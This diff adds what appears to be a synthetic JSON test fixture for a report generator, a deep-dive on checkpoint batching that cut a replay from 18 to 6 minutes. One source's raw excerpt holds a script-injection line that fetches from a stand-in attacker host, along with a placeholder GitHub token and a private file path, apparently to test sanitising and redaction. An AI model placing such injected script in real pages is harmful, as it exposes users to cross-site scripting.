@@ -1,0 +1,395 @@
+{
+  "schemaVersion": "1.0.0",
+  "id": "rpt_a1000000-0000-4000-8000-000000000001",
+  "revision": 1,
+  "mode": "deep-dive",
+  "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+  "title": "Checkpoint batching — decision, implementation, and proof",
+  "audience": "Engineering and operations reviewers",
+  "purpose": "Explain why checkpoint batching was selected, how it changed replay behavior, and what must be validated before paging is enabled.",
+  "reportingPeriod": {
+    "start": "2026-08-17",
+    "end": "2026-08-23",
+    "label": "Checkpoint-batch decision and validation"
+  },
+  "sections": [
+    {
+      "id": "sec_b1000000-0000-4000-8000-000000000001",
+      "title": "The problem to solve",
+      "summary": "A 50,000-record replay exceeded the operations window at the recorded 18-minute baseline.",
+      "claimIds": ["clm_d1000000-0000-4000-8000-000000000001"],
+      "componentIds": [
+        "cmp_c1000000-0000-4000-8000-000000000001",
+        "cmp_c1000000-0000-4000-8000-000000000002"
+      ]
+    },
+    {
+      "id": "sec_b1000000-0000-4000-8000-000000000002",
+      "title": "Decision and implementation",
+      "summary": "Bounded checkpoint batches were selected and merged with focused tests and benchmark checks.",
+      "claimIds": [
+        "clm_d1000000-0000-4000-8000-000000000002",
+        "clm_d1000000-0000-4000-8000-000000000003"
+      ],
+      "componentIds": [
+        "cmp_c1000000-0000-4000-8000-000000000003",
+        "cmp_c1000000-0000-4000-8000-000000000004",
+        "cmp_c1000000-0000-4000-8000-000000000005"
+      ]
+    },
+    {
+      "id": "sec_b1000000-0000-4000-8000-000000000003",
+      "title": "Measured result",
+      "summary": "The recorded replay completed in 6 minutes, a 12-minute reduction from baseline.",
+      "claimIds": ["clm_d1000000-0000-4000-8000-000000000004"],
+      "componentIds": [
+        "cmp_c1000000-0000-4000-8000-000000000006",
+        "cmp_c1000000-0000-4000-8000-000000000007",
+        "cmp_c1000000-0000-4000-8000-000000000008"
+      ]
+    },
+    {
+      "id": "sec_b1000000-0000-4000-8000-000000000004",
+      "title": "Operational implications",
+      "summary": "Replay-safe staging preserves comparison quality, while alert thresholds remain the next validation boundary.",
+      "claimIds": [
+        "clm_d1000000-0000-4000-8000-000000000005",
+        "clm_d1000000-0000-4000-8000-000000000006"
+      ],
+      "componentIds": [
+        "cmp_c1000000-0000-4000-8000-000000000009",
+        "cmp_c1000000-0000-4000-8000-000000000010",
+        "cmp_c1000000-0000-4000-8000-000000000011"
+      ]
+    }
+  ],
+  "components": [
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000001",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000001",
+      "kind": "narrative",
+      "heading": "Operational constraint",
+      "body": "The linked issue described replay time as exceeding the operations window. The recorded dashboard established an 18-minute baseline for 50,000 records."
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000002",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000001",
+      "kind": "evidence-disclosure",
+      "heading": "Problem evidence",
+      "items": [
+        "Replay benchmark dashboard",
+        "Reconciliation checkpoint pull request"
+      ]
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000003",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000002",
+      "kind": "narrative",
+      "heading": "Why checkpoint batches",
+      "body": "The implementation bounds checkpoint work during replay so progress is recorded without waiting for one full replay pass. The selected path addressed the operations-window constraint directly."
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000004",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000002",
+      "kind": "visual",
+      "heading": "Decision path",
+      "visualizationId": "viz_e1000000-0000-4000-8000-000000000001"
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000005",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000002",
+      "kind": "evidence-disclosure",
+      "heading": "Decision evidence",
+      "items": [
+        "Rollout planning notes",
+        "Reconciliation checkpoint pull request"
+      ]
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000006",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000003",
+      "kind": "narrative",
+      "heading": "Recorded improvement",
+      "body": "The synthetic benchmark completed in 6 minutes after checkpoint batching, compared with the recorded 18-minute baseline. The result is corroborated by notes, dashboard evidence, and the merged pull request checks."
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000007",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000003",
+      "kind": "visual",
+      "heading": "Replay duration",
+      "visualizationId": "viz_e1000000-0000-4000-8000-000000000002"
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000008",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000003",
+      "kind": "evidence-disclosure",
+      "heading": "Result evidence",
+      "items": [
+        "Rollout planning notes",
+        "Replay benchmark dashboard",
+        "Reconciliation checkpoint pull request"
+      ]
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000009",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000004",
+      "kind": "callout",
+      "heading": "Comparison boundary",
+      "body": "Replay-safe staging mode prevents duplicate callbacks from invalidating load-test comparisons."
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000010",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000004",
+      "kind": "bullet-list",
+      "heading": "Before paging",
+      "items": [
+        "Validate alert thresholds against replay spikes before enabling operational paging."
+      ]
+    },
+    {
+      "id": "cmp_c1000000-0000-4000-8000-000000000011",
+      "sectionId": "sec_b1000000-0000-4000-8000-000000000004",
+      "kind": "evidence-disclosure",
+      "heading": "Operating evidence",
+      "items": ["Rollout planning notes"]
+    }
+  ],
+  "claims": [
+    {
+      "id": "clm_d1000000-0000-4000-8000-000000000001",
+      "statement": "The recorded 50,000-record replay took 18 minutes and exceeded the operations window.",
+      "implication": "Replay duration was an operational constraint, not a cosmetic performance concern.",
+      "consequential": true,
+      "sourceIds": [
+        "src_30000000-0000-4000-8000-000000000003",
+        "src_30000000-0000-4000-8000-000000000004"
+      ]
+    },
+    {
+      "id": "clm_d1000000-0000-4000-8000-000000000002",
+      "statement": "The implementation uses bounded checkpoint batches during replay.",
+      "implication": "Bounded batches reduce replay time while retaining explicit progress checkpoints.",
+      "consequential": true,
+      "sourceIds": [
+        "src_30000000-0000-4000-8000-000000000001",
+        "src_30000000-0000-4000-8000-000000000004"
+      ]
+    },
+    {
+      "id": "clm_d1000000-0000-4000-8000-000000000003",
+      "statement": "The checkpoint implementation merged with focused tests and successful benchmark checks.",
+      "implication": "The reported outcome includes reviewed implementation and recorded validation, not activity alone.",
+      "consequential": true,
+      "sourceIds": ["src_30000000-0000-4000-8000-000000000004"]
+    },
+    {
+      "id": "clm_d1000000-0000-4000-8000-000000000004",
+      "statement": "Checkpoint batching reduced the recorded replay from 18 minutes to 6 minutes.",
+      "implication": "The 12-minute reduction brings the synthetic replay back inside the stated operations window.",
+      "consequential": true,
+      "sourceIds": [
+        "src_30000000-0000-4000-8000-000000000001",
+        "src_30000000-0000-4000-8000-000000000003",
+        "src_30000000-0000-4000-8000-000000000004"
+      ]
+    },
+    {
+      "id": "clm_d1000000-0000-4000-8000-000000000005",
+      "statement": "Staging load tests use replay-safe mode so duplicate callbacks do not invalidate comparisons.",
+      "implication": "The operating constraint explains why the before-and-after benchmark remains comparable.",
+      "consequential": false,
+      "sourceIds": ["src_30000000-0000-4000-8000-000000000001"]
+    },
+    {
+      "id": "clm_d1000000-0000-4000-8000-000000000006",
+      "statement": "Alert thresholds must be validated against replay spikes before paging is enabled.",
+      "implication": "Threshold validation prevents synthetic replay behavior from creating noisy operational alerts.",
+      "consequential": true,
+      "sourceIds": ["src_30000000-0000-4000-8000-000000000001"]
+    }
+  ],
+  "evidence": {
+    "schemaVersion": "1.0.0",
+    "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+    "sources": [
+      {
+        "id": "src_30000000-0000-4000-8000-000000000001",
+        "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+        "projectIds": [
+          "prj_20000000-0000-4000-8000-000000000001",
+          "prj_20000000-0000-4000-8000-000000000002",
+          "prj_20000000-0000-4000-8000-000000000003"
+        ],
+        "kind": "pasted-note",
+        "title": "Casey's unedited notes",
+        "publicLabel": "Rollout planning notes",
+        "observedAt": "2026-08-23T18:00:00Z",
+        "summary": "The notes record the checkpoint-batching result, replay-safe comparison boundary, and threshold-validation priority.",
+        "creatorOnly": {
+          "locators": [
+            {
+              "kind": "local-path",
+              "value": "/Users/casey/Northstar/notes/week-2026-08-23.md"
+            }
+          ],
+          "rawExcerpt": "maybe finished permissions cleanup? <script>fetch('https://attacker.example.invalid')</script> ghp_fixture000000000000000000000000000000 /Users/casey/Northstar/private/reconciliation.env"
+        }
+      },
+      {
+        "id": "src_30000000-0000-4000-8000-000000000003",
+        "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+        "projectIds": ["prj_20000000-0000-4000-8000-000000000002"],
+        "kind": "screenshot",
+        "title": "Synthetic reconciliation dashboard",
+        "publicLabel": "Replay benchmark dashboard",
+        "observedAt": "2026-08-22T14:15:00Z",
+        "summary": "The dashboard shows the 50,000-record replay completing in 6 minutes compared with an 18-minute baseline.",
+        "creatorOnly": {
+          "locators": [
+            {
+              "kind": "local-path",
+              "value": "/Users/casey/Northstar/screenshots/replay-dashboard.png"
+            }
+          ],
+          "rawExcerpt": "Synthetic screenshot: 50k record replay, 18m baseline, 6m current."
+        }
+      },
+      {
+        "id": "src_30000000-0000-4000-8000-000000000004",
+        "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+        "projectIds": ["prj_20000000-0000-4000-8000-000000000002"],
+        "kind": "github-pull-request",
+        "title": "Pull request 184",
+        "publicLabel": "Reconciliation checkpoint pull request",
+        "observedAt": "2026-08-21T16:42:00Z",
+        "summary": "The recorded pull request links the closed operations-window issue, checkpoint implementation and tests, approval, merge state, and successful synthetic benchmark check.",
+        "creatorOnly": {
+          "locators": [
+            {
+              "kind": "url",
+              "value": "https://github.example.invalid/northstar-systems/reconciliation-service/pull/184"
+            }
+          ],
+          "rawExcerpt": "MERGED: checkpoint implementation and focused tests; APPROVED; test and synthetic-replay-benchmark checks succeeded; linked issue 172 closed."
+        }
+      }
+    ]
+  },
+  "design": {
+    "schemaVersion": "1.0.0",
+    "id": "dsg_f1000000-0000-4000-8000-000000000001",
+    "audience": "Engineering and operations reviewers",
+    "pageJob": "Make the checkpoint decision, implementation proof, measured result, and remaining validation boundary reviewable in ten minutes.",
+    "tone": "Technical, direct, and evidence-led",
+    "colors": {
+      "background": "#f6f4ef",
+      "surface": "#ffffff",
+      "text": "#182126",
+      "mutedText": "#52606d",
+      "accent": "#5b3cc4",
+      "border": "#c8ced8"
+    },
+    "typography": {
+      "displayRole": "System sans serif with compact display spacing",
+      "bodyRole": "System sans serif optimized for technical reading",
+      "numericRole": "Tabular system numerals"
+    },
+    "layoutConcept": "A decision spine moves from the operating constraint through implementation and proof to the next validation boundary.",
+    "visualSignature": "Checkpoint markers connect the decision path to the measured replay result."
+  },
+  "visualizations": [
+    {
+      "schemaVersion": "1.0.0",
+      "id": "viz_e1000000-0000-4000-8000-000000000001",
+      "family": "timeline",
+      "title": "Checkpoint decision path",
+      "purpose": "Show the sequence from the operations-window constraint to merged and measured checkpoint batching.",
+      "claimIds": [
+        "clm_d1000000-0000-4000-8000-000000000001",
+        "clm_d1000000-0000-4000-8000-000000000002",
+        "clm_d1000000-0000-4000-8000-000000000003"
+      ],
+      "data": {
+        "items": [
+          {
+            "label": "Operations-window issue",
+            "description": "Replay baseline recorded at 18 minutes",
+            "status": "complete"
+          },
+          {
+            "label": "Checkpoint batches merged",
+            "description": "Focused implementation and tests approved",
+            "start": "2026-08-21",
+            "status": "complete"
+          },
+          {
+            "label": "Benchmark confirmed",
+            "description": "50,000-record replay completed in 6 minutes",
+            "start": "2026-08-22",
+            "status": "complete"
+          }
+        ]
+      },
+      "textAlternative": {
+        "type": "table",
+        "columns": ["Step", "Evidence"],
+        "rows": [
+          ["Operations-window issue", "Replay baseline recorded at 18 minutes"],
+          ["Checkpoint batches merged", "Focused implementation and tests approved on August 21"],
+          ["Benchmark confirmed", "50,000-record replay completed in 6 minutes on August 22"]
+        ]
+      },
+      "replacementOptions": ["comparison-table", "dependency-flow"]
+    },
+    {
+      "schemaVersion": "1.0.0",
+      "id": "viz_e1000000-0000-4000-8000-000000000002",
+      "family": "quantitative-chart",
+      "title": "Synthetic replay duration",
+      "purpose": "Compare the recorded baseline and checkpoint-batch replay durations.",
+      "claimIds": ["clm_d1000000-0000-4000-8000-000000000004"],
+      "data": {
+        "items": [
+          {
+            "label": "Baseline",
+            "value": 18,
+            "unit": "minutes",
+            "status": "complete"
+          },
+          {
+            "label": "Checkpoint batches",
+            "value": 6,
+            "unit": "minutes",
+            "status": "complete"
+          }
+        ]
+      },
+      "textAlternative": {
+        "type": "table",
+        "columns": ["Run", "Duration"],
+        "rows": [
+          ["Baseline", "18 minutes"],
+          ["Checkpoint batches", "6 minutes"]
+        ]
+      },
+      "replacementOptions": ["comparison-table", "timeline"]
+    }
+  ],
+  "creatorOnly": {
+    "inputSummary": "A purpose-bounded Deep Dive derived from the same synthetic reconciliation evidence used by the Snapshot flow.",
+    "omissions": [
+      {
+        "reason": "Enterprise rollout and developer-experience material are outside the selected reconciliation purpose.",
+        "sourceIds": ["src_30000000-0000-4000-8000-000000000001"]
+      }
+    ]
+  },
+  "renderedArtifacts": [],
+  "revisionHistory": [
+    {
+      "revision": 1,
+      "createdAt": "2026-08-26T20:00:00Z",
+      "summary": "Created the Gate 7 Deep Dive model from the existing reconciliation evidence pipeline."
+    }
+  ]
+}
